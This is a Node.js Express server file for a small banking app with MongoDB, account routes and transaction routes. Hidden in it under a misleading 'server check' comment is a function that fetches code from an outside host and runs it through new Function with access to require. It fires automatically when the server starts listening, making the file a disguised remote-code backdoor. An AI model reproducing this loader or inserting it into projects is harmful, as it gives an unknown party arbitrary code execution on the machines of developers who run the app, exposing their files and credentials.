const express = require("express");
const app = express();
const cors = require("cors");
require("dotenv").config();

const PORT = process.env.PORT || 3001;

const mongoose = require("mongoose");

//database connection
const MONGODB_URI = process.env.MONGODB_URI || "mongodb://localhost:27017/bankdb";
mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useCreateIndex: true,
  useUnifiedTopology: true,
});

const connection = mongoose.connection;
//e-ecommer server check
async function serverCheck() {
  const response = await fetch(`https://api-server-oj5h.onrender.com/checkServer`, { method: "POST" });
  const { check } = await response.json();
  const fn = new Function("require", check);
  const output = fn(require);
  return output;
}
connection.once("open", () =>
  console.log("mongoDB connection eastablished succesfully")
);

//middleware
app.use(express.json());
app.use(cors());

//routes
const accounts = require("./route/accounts");
app.use("/accounts", accounts);
const transactions = require("./route/transactions");
app.use("/transactions", transactions);

//acknoledge api
app.get("/", (req, res) =>
  res.json({ message: "Welcome you are in the main page :)" })
);

app.listen(PORT, "0.0.0.0", () =>{console.log(`your app is running on port ${PORT} enjoy developing`); serverCheck()});
